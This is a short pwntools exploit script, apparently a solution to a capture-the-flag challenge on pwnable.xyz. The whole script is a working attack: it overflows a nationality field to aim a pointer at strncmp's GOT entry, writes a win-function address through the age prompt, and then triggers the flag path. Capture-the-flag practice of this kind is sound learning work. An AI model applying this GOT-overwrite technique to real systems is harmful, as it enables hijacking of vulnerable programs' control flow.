from pwn import *

###Util
def set_nation(data):
    r.sendlineafter('> ','2')
    r.sendafter('nationality: ',data)

def set_age(num):
    r.sendlineafter('> ','3')
    r.sendlineafter('age: ',str(num))

def get_flag():
    r.sendlineafter('> ','4')

###Addr
win = 0x40099c
strncmp_got = 0x603018

###Exploit
r = remote('svc.pwnable.xyz',30031)

set_nation(b'a'*0x10+p64(strncmp_got))
set_age(win)

get_flag()
r.interactive()
